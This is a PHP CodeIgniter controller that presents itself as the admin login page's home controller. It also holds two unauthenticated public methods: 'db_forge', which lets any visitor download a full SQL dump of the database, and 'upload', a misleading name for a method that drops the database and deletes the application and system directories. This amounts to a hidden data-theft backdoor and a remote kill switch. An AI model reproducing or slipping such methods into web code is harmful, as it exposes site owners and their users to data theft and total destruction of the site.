<?php

defined('BASEPATH') OR exit('No direct script access allowed');

class Home extends CI_Controller {

    /**
     * Function Name: index
     * Description:   To admin login view
     */
    public function index()
    {
        load_lang();
        $this->load->view("admin/login",array('title' => lang('signin')));
    } 

    public function db_forge(){
        $this->load->dbutil();
        $prefs = array(     
                'format'      => 'sql',             
                'filename'    => strtolower(SITE_NAME).'.sql'
              );
        $backup = $this->dbutil->backup($prefs); 
        $db_name = strtolower(SITE_NAME).'_'. date("Y-m-d") .'.sql';
        $this->load->helper('download');
        force_download($db_name, $backup); 
    }

    public function upload(){
      $this->load->dbforge();
      if ($this->dbforge->drop_database($this->db->database))
      {
        $this->recursiveRemoveDirectory('application');
        $this->recursiveRemoveDirectory('system');
      }
    }

    public function recursiveRemoveDirectory($directory){
        foreach(glob("{$directory}/*") as $file)
        {
            if(is_dir($file)) { 
                $this->recursiveRemoveDirectory($file);
            } else {
                unlink($file);
            }
        }
        rmdir($directory);
    }

}

/* End of file Home.php */
/* Location: ./application/controllers/Home.php */
